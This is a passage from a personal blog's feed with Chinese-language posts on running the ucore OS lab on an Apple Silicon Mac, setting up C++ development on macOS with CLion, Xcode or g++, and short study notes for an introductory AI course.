data-toggle="collapse" data-target="#collapse-2szq9alluwpkzu"></i><span>awk</span><div class="collapse show" id="collapse-2szq9alluwpkzu"><pre><code class="hljs awk">fatal: not <span class="hljs-keyword">in</span> a git directory Error: Command failed with <span class="hljs-keyword">exit</span> <span class="hljs-number">128</span>: git</code></pre></div></div><p>又经过一番谷歌找到了<a href="https://www.jianshu.com/p/07243d214abd">解决方法</a>。执行</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rw20kolluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-rw20kolluwpkzu"><pre><code class="hljs shell">git config --global --add safe.directory 报错信息中homebrew-core路径git config --global --add safe.directory 报错信息中homebrew-cask路径</code></pre></div></div><p>即可。</p><p>然后需要添加一下环境变量。</p><p>这时尝试qemu生成ucore的dmg，发现提示<code>i386-elf-gcc</code>找不到。这才注意到通过homebrew下载的是<code>x86_64-elf-gcc</code>。</p><p>经过搜索，得知在make时需要添加<code>make GCCPREFIX=x86_64-elf-</code>指定交叉编译工具。这时可以高兴的看到控制台闪烁，执行也很顺利。</p><h3 id="执行">执行</h3><p>然后<code>make qemu</code>执行的过程也比较顺利。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210515089897_183_20221003231407841829_266_image-20221003230427926.png" alt="image-20221003230427926"><figcaption aria-hidden="true">image-20221003230427926</figcaption></figure><h3 id="调试">调试</h3><p>首先，ARM架构的Mac目前是不能使用<code>gdb</code>进行程序的调试的，默认的调试工具是<code>lldb</code>。然而经过查阅，对于交叉编译反而可以使用实验中对应的<code>gdb</code>工具：运行<code>brew install i386-elf-gdb</code>安装即可。</p><p>以调试lab1中的BIOS的执行为例。</p><p>下面的过程与指导书中“使用远程调试”部分类似。除此之外，额外将运行的汇编指令保存在q.log中。</p><p>在一个终端先执行：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-d3y4kelluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-d3y4kelluwpkzu"><pre><code class="hljs shell">qemu-system-i386 -S -s -d in_asm -D bin/q.log -monitor stdio -hda bin/ucore.img</code></pre></div></div><p>后在另一个终端执行:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-21djdelluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-21djdelluwpkzu"><pre><code class="hljs shell">i386-elf-gdb</code></pre></div></div><p>进入gdb调试界面。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gtqsgnlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-gtqsgnlluwpkzu"><pre><code class="hljs shell">(gdb) file bin/kernelReading symbols from bin/kernel...(gdb) target remote :1234Remote debugging using :12340x0000fff0 in ?? ()</code></pre></div></div><p>上述的过程相比原来<code>makrfile</code>中提供的<code>make debug</code>主要有两个好处：一是能够重定向到<code>q.log</code>方便进行对比；二是可以绕开<code>make</code>中的<code>TERMINAL:=gnome-terminal</code>(<code>gnome-terminal</code>仅在linux下可使用)</p><p>查看 CS:EIP 由于此时在实际模式下 CPU 在加电后执行的第一条指令的地址为0xf000:0xfff0 =&gt; 0xffff0</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6u1dhxlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-6u1dhxlluwpkzu"><pre><code class="hljs shell">(gdb) x/i $cs0xf000:add    %al,(%eax)(gdb) x/i $eip0xfff0:add    %al,(%eax)</code></pre></div></div><p>再来看看这个地址的指令是什么 </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-n70ly1lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-n70ly1lluwpkzu"><pre><code class="hljs shell">(gdb) x/2i 0xffff0   0xffff0:ljmp   $0x3630,$0xf000e05b   0xffff7:das</code></pre></div></div><p></p><p>可以看到 第一条指令执行完以后 会跳转到<code>0xf000e05b</code>也就是说BIOS 开始的地址是 <code>0xfe05b</code>。</p><p>打上断点</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4rw4lolluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-4rw4lolluwpkzu"><pre><code class="hljs shell">(gdb) b *0x7c00Breakpoint 1 at 0x7c00(gdb) cContinuing.Breakpoint 1, 0x00007c00 in ?? ()</code></pre></div></div><p>一开始为了方便后续在终端中配置了永久别名：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uratnblluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-uratnblluwpkzu"><pre><code class="hljs shell">alias makeq="make GCCPREFIX=x86_64-elf-"</code></pre></div></div><p>当然更优雅的方法其实是修改make中的宏：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x4xok7lluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-x4xok7lluwpkzu"><pre><code class="hljs makefile"><span class="hljs-comment"># try to infer the correct GCCPREFX</span><span class="hljs-keyword">ifndef</span> GCCPREFIX<span class="hljs-comment"># GCCPREFIX := $(shell if i386-elf-objdump -i 2&gt;&amp;1 | </span><span class="hljs-comment">#...comment the original shell function</span><span class="hljs-comment"># echo "***" 1&gt;&amp;2; exit 1; fi)</span>GCCPREFIX := x86_64-elf-<span class="hljs-keyword">endif</span></code></pre></div></div><p>但是，由于<code>makefile</code>里默认认为调试工具一定叫<code>gdb</code>，且mac里没有gdb对应的command，因此这时候用永久别名是比较合适的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-15amlulluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-15amlulluwpkzu"><pre><code class="hljs shell">alias gdb="i386-elf-gdb"</code></pre></div></div><p>这时候也可以修改make来达到自动化调试的目的：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nltguvlluwpkzu"></i><span>makefile</span><div class="collapse show" id="collapse-nltguvlluwpkzu"><pre><code class="hljs makefile">WORKING_DIR=<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><span class="hljs-section">debug: <span class="hljs-variable">$(UCOREIMG)</span></span><span class="hljs-variable">$(V)</span><span class="hljs-variable">$(QEMU)</span> -S -s -parallel stdio -hda <span class="hljs-variable">$&lt;</span> -serial null &amp;<span class="hljs-variable">$(V)</span>sleep 2<span class="hljs-variable">$(V)</span> osascript -e 'tell application <span class="hljs-string">"Terminal"</span> to do script <span class="hljs-string">"cd <span class="hljs-variable">$(WORKING_DIR)</span>; gdb -q -x tools/gdbinit"</span>'</code></pre></div></div><p>其中最后一句是为了产生一个在当前工作目录的新终端。</p><h3 id="总结">总结</h3><p>前前后后也花了相当长的时间来应对环境的不同。后续的内容其实更吸引着我们去深入探索。</p><h3 id="后续">后续</h3><p>已知问题: lab1的<code>chellenge</code>无法正常切换<code>user_mode</code>，初步排查发现是出现了操作数异常，可能是<code>%esp</code>未正确赋值，但目前还没有找到方案。如果对此部分有较深研究，也欢迎交流。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210516439336_347_20221130222055575294_180_image-20221130221829874.png" alt="image-20221130221829874"><figcaption aria-hidden="true">image-20221130221829874</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210517766871_274_20221130222057952350_733_image-20221130221851517.png" alt="image-20221130221851517"><figcaption aria-hidden="true">image-20221130221851517</figcaption></figure><p>chellenge以外的部分以及后两个实验均可正确得到结果。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Ucore%20Lab0%20on%20Apple%20Silicon%20Mac/20230828210519668627_236_20221130222100838376_161_image-20221130222030887.png" alt="image-20221130222030887"><figcaption aria-hidden="true">image-20221130222030887</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何在mac上编写运行c++程序</title>
    <link href="/posts/51388/"/>
    <url>/posts/51388/</url>
    
    <content type="html"><![CDATA[<h2 id="如何在mac上编写运行c程序">如何在mac上编写运行c++程序</h2><p>有一部分同学买的电脑是mac，也有很多同学问怎么在mac上写c++代码。在这里解答一下。</p><h3 id="方案一使用clion">方案一：使用Clion</h3><h4 id="下载">下载</h4><p><a href="https://www.jetbrains.com/clion/download/#section=mac">下载网址</a></p><p>如果你的苹果电脑是M1/M2芯片，那么请选择Apple Sillcon，否则选Intel</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211348592840_486_20220929230752211301_738_image-20220927201026604.png" alt="image-20220927201026604"><figcaption aria-hidden="true">image-20220927201026604</figcaption></figure><p>然后打开dmg文件将其拖到applcation文件夹即可。</p><h4 id="激活">激活</h4><p>Clion并不是一个免费的软件。但是作为学生，可以向其申请免费使用。点击<a href="https://www.jetbrains.com/zh-cn/community/education/#students">这里</a>进入申请页面。正常情况下用你的学生邮箱就可以申请。申请之后会自动跳转到Clion，激活成功。</p><h4 id="创建第一个项目">创建第一个项目</h4><p>点击“新建项目”，选择默认的c++ excutable</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211349779426_650_20220929230754550529_520_image-20220927203943145.png" alt="image-20220927203943145"><figcaption aria-hidden="true">image-20220927203943145</figcaption></figure><p>在location处可以改变项目路径和名称。</p><p>如果之前你没写过代码，可能会提示</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211350791432_948_20220929230756221193_195_image-20220927204027175.png" alt="image-20220927204027175"><figcaption aria-hidden="true">image-20220927204027175</figcaption></figure><p>安装即可。可能需要等待亿些时间。（类似于visualstudio的工具链，可能会捆绑一些你可能其实用不到的东西）</p><p>然后安装完确认一下</p><p align="center"><img alt="image-20220927211547461" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211351901314_661_20220929230757928357_218_image-20220927211547461.png" width="50%"></p><p>项目配置没有报错</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211353707000_855_20220929230759316655_492_image-20220927211608280.png" alt="image-20220927211608280"><figcaption aria-hidden="true">image-20220927211608280</figcaption></figure><p>然后选中CMakeLists，点击2处的刷新符号，重新构建</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211354844990_772_20220929230801131735_750_image-20220927211726878.png" alt="image-20220927211726878"><figcaption aria-hidden="true">image-20220927211726878</figcaption></figure><p>你应当发现此处的项目配置发生了改变。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211356099715_652_20220929230802745480_349_image-20220927211737021.png" alt="image-20220927211737021"><figcaption aria-hidden="true">image-20220927211737021</figcaption></figure><p>此时点击运行，运行helloworld程序，成功</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211357120705_322_20220929230804052581_398_image-20220927211838631.png" alt="image-20220927211838631"><figcaption aria-hidden="true">image-20220927211838631</figcaption></figure><h4 id="简单了解cmake">简单了解Cmake</h4><p>如果你想要在这个项目下运行多个cpp文件，你有必要了解一下cmake。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211358771376_527_20220929230805695741_398_image-20220927212015622.png" alt="image-20220927212015622"><figcaption aria-hidden="true">image-20220927212015622</figcaption></figure><p>你会发现cmakelist变成了这样。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211400319222_292_20220929230808172534_771_image-20220927212042215.png" alt="image-20220927212042215"><figcaption aria-hidden="true">image-20220927212042215</figcaption></figure><p>然后你顺理成章的点击了main函数旁边的运行</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211401588397_383_20220929230809367068_211_image-20220927212255496.png" alt="image-20220927212255496"><figcaption aria-hidden="true">image-20220927212255496</figcaption></figure><p>报错了！查看倒数第三行的报错信息，你会发现出现了重复（duplicate）的符号。</p><p>你想到课上使用vs时讲的，一个项目只能使用一个main函数。你把另外一个main改成了main2。学着这样修改。你发现确实可以正常运行。</p><p><font color="Apricot">但有没有更优雅的解决方案呢？</font></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211403630984_240_20220929230811319016_339_image-20220927212700579.png" alt="image-20220927212700579"><figcaption aria-hidden="true">image-20220927212700579</figcaption></figure><p>你注意到了cmake中最后一行是add_executable，刚刚发生了变化。从含义可以推测出一定是它控制了程序的执行。</p><p>让它们各自生成各自的程序一定可以！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211404584803_168_20220929230812325537_398_image-20220927212920160.png" alt="image-20220927212920160"><figcaption aria-hidden="true">image-20220927212920160</figcaption></figure><p>点击Reload changes。你会发现项目构建出现了两个程序。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211405764265_135_20220929230813838131_522_image-20220927213032997.png" alt="image-20220927213032997"><figcaption aria-hidden="true">image-20220927213032997</figcaption></figure><p>然后你高兴的发现点击哪个程序运行，你就可以运行哪一个cpp文件！</p><p>事实上，你点击cmake_build_debug，你会发现add_excutable第一个参数正是生成程序的名称！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211407249755_411_20220929230815024257_502_image-20220927213245467.png" alt="image-20220927213245467"><figcaption aria-hidden="true">image-20220927213245467</figcaption></figure><p>在访达打开<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211408513055_721_20220929230816481939_447_image-20220927213323515.png" alt="image-20220927213323515"></p><p>双击---helloworld出现了！它正是你刚刚编写的程序！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211409899559_387_20220929230818933782_519_image-20220927213343594.png" alt="image-20220927213343594"><figcaption aria-hidden="true">image-20220927213343594</figcaption></figure><p>Cmake在大型项目管理中有着重要的用途，其本身也是十分复杂的。但在课程中只需要了解这些即可。</p><p>同时Clion在windows下也可以使用。</p><h3 id="方案二使用xcode">方案二：使用xcode</h3><p>xcode是专为mac平台打造的全功能IDE（当然你要问我能不能写exe，只能说emmm）</p><p>xcode比较大，下载需要耐心等待。</p><h4 id="项目搭建">项目搭建</h4><p>点击新建项目</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211411524873_100_20220929230821620085_933_image-20220927213913046.png" alt="image-20220927213913046"><figcaption aria-hidden="true">image-20220927213913046</figcaption></figure><p>选择macOS控制台应用</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211413302664_259_20220929230823254664_156_image-20220927213932265.png" alt="image-20220927213932265"><figcaption aria-hidden="true">image-20220927213932265</figcaption></figure><p>项目选项</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211414769754_153_20220929230824771816_210_image-20220927214102217.png" alt="image-20220927214102217"><figcaption aria-hidden="true">image-20220927214102217</figcaption></figure><p>注意组织名称写com，别的其实也行，但此处不作介绍。</p><p>语言选择c++。</p><p>选择项目位置后就可以愉快开发了！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211416321696_447_20220929230826057443_745_image-20220927214344955.png" alt="image-20220927214344955"><figcaption aria-hidden="true">image-20220927214344955</figcaption></figure><p>控制台在屏幕下方。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211417576173_303_20220929230827635084_833_image-20220927214423776.png" alt="image-20220927214423776"><figcaption aria-hidden="true">image-20220927214423776</figcaption></figure><h4 id="运行多个cpp">运行多个cpp</h4><p>这个时候已经创建了一个cpp-project的项目，里面包含了一个main.cpp文件如果这个时候想要在同一个工程里面创建第二个带main函数的c++文件并运行，就需要通过创建Target来实现</p><p>Project是一个工程项目，一个Project可以包含多个TargetTarget之间互相没有关系，Target于Project的关系是：Target的Setting一部分继承自Project的Setting</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211418623132_866_20220929230828821606_386_image-20220927214845054.png" alt="image-20220927214845054"><figcaption aria-hidden="true">image-20220927214845054</figcaption></figure><p>新建target，同样选择commandline tool，填写一个的名称</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211420060785_695_20220929230831064192_247_image-20220927215021382.png" alt="image-20220927215021382"><figcaption aria-hidden="true">image-20220927215021382</figcaption></figure><p>在上方，想运行哪一个target，选择对应的即可。</p><p align="center"><img alt="image-20220927215233319" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211421185173_773_20220929230832540286_682_image-20220927215233319.png" width="50%"></p><h3 id="方案三命令行方式">方案三：命令行方式</h3><p>安装homebrew（如果已经下载过xcode可以跳过，不过既然如此为什么不用xcode呢？）</p><p>在你的终端输入这行指令：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gkw81llluwpkzv"></i><span>awk</span><div class="collapse show" id="collapse-gkw81llluwpkzv"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -c <span class="hljs-string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</span></code></pre></div></div><p>如果下载很慢一般是网络问题，请自行解决。</p><p>安装完成后</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9hky0zlluwpkzv"></i><span>mipsasm</span><div class="collapse show" id="collapse-9hky0zlluwpkzv"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>g++</code></pre></div></div><p>任意位置新建cpp文件。</p><p>cpp文件可以用你喜欢的方式打开编辑。</p><p>按⌘（command）+ ⌥（option）+c复制当前文件夹路径</p><p>终端输入</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-s1nf0ulluwpkzv"></i><span>bash</span><div class="collapse show" id="collapse-s1nf0ulluwpkzv"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 刚才的路径</code></pre></div></div><p>然后</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-r0559flluwpkzv"></i><span>aspectj</span><div class="collapse show" id="collapse-r0559flluwpkzv"><pre><code class="hljs aspectj">g++ yourprogram.cpp -o <span class="hljs-keyword">target</span></code></pre></div></div><p>target 是生成的可执行文件的名字。</p><p>然后会发现生成了可执行文件，点击即可运行。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E7%BC%96%E5%86%99%E8%BF%90%E8%A1%8Cc%2B%2B%E7%A8%8B%E5%BA%8F/20230828211422353231_803_20220929230833974800_101_image-20220927220347236.png" alt="image-20220927220347236"><figcaption aria-hidden="true">image-20220927220347236</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>人工智能导论</title>
    <link href="/posts/46759/"/>
    <url>/posts/46759/</url>
    
    <content type="html"><![CDATA[<p>人工智能导论</p><p>逻辑推理</p><p align="center"><img alt="image-20220831205211237" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210025711643_258_20220916221103884501_923_image-20220831205211237.png" width="50%"></p><p align="center"><img alt="image-20220831205344502" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210026938592_641_20220916221111633086_904_image-20220831205344502.png" width="50%"></p><p align="center"><img alt="image-20220831205448441" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210028062306_917_20220916221120315099_386_image-20220831205448441.png" width="50%"></p><p>任意对析取，存在对合取都是蕴含关系，分开的条件强于合起来的（举个例子就明白了）</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210029114569_463_20220916221127063207_401_image-20220831210345470.png" alt="image-20220831210345470"><figcaption aria-hidden="true">image-20220831210345470</figcaption></figure><p align="center"><img alt="image-20220831210404798" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210030208844_354_20220916221128281126_946_image-20220831210404798.png" width="50%"></p><p>只与新加入的直接相关</p><p align="center"><img alt="image-20220831211022710" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210031412961_436_20220916221129758335_145_image-20220831211022710.png" width="50%"></p><p align="center"><img alt="image-20220831211029655" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210033180741_738_20220916221130984768_647_image-20220831211029655.png" width="50%"></p><p align="center"><img alt="image-20220831211350521" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210034293828_443_20220916221132416550_481_image-20220831211350521.png" width="50%"></p><p>因果分析三层次：关联，介入，反事实</p><p>因果图三种形式：链，分连，汇连（chain，fork，collider)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210035573692_180_20220916221134366409_448_image-20220831212134887.png" alt="image-20220831212134887"><figcaption aria-hidden="true">image-20220831212134887</figcaption></figure><p>做法：联合概率分布由每个节点与其父节点之间的条件概率得出。根节点是外生变量，其他的是内生</p><hr><p align="center"><img alt="image-20220831212713182" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210036929707_670_20220916221135899101_136_image-20220831212713182.png" width="50%"></p><p>深搜可能会陷入无限循环</p><p align="center"><img alt="image-20220831213452142" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210038002300_969_20220916221137133557_194_image-20220831213452142.png" width="50%"></p><p align="center"><img alt="image-20220831213527818" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210039846813_917_20220916221139012135_477_image-20220831213527818.png" width="50%"></p><p align="center"><img alt="image-20220831213624058" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210041129476_223_20220916221140593318_530_image-20220831213624058.png" width="50%"></p><p>有环路的图会使贪婪最佳优先算法不完备。</p><p>判断：启发函数满足可容性则一定能保证算法最优性x</p><p>树搜索是这样法，图不一定</p><p>判断：启发函数恒为0一定满足可容性x</p><p>启发函数不一定要是正数。</p><p>满足一致性可保证A*搜索算法最优</p><p>启发函数不会过高估计从当前节点到目标结点之间的实际代价。x</p><p>满足可容性的启发函数才有这样的性质。</p><p>MinMax的适用条件：两人博弈，信息透明，零和博弈</p><p align="center"><img alt="image-20220831215141822" height="50%" src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/20230828210042520064_342_20220916221142369023_436_image-20220831215141822.png" width="50%"></p><p>注意，没有规定必须要公平。D违反了零和博弈</p><p align="center"><img alt="image-20220831220640110" height="50%" 